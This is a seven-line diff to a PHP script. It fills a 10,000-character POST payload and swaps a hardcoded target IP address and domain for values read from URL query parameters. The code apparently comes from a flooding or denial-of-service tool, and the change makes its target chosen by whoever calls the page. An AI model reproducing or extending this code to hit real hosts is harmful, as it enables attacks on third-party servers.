@@ -1,7 +1,7 @@
 $data = str_repeat("A", 10000);
 
-$ip = "13.251.108.88";
-$host = "agm-invest.com";
+$ip = $_GET['ip'];
+$host = $_GET['host'];
 $path = "/";
 $post_data = 'data=' . $data;
 
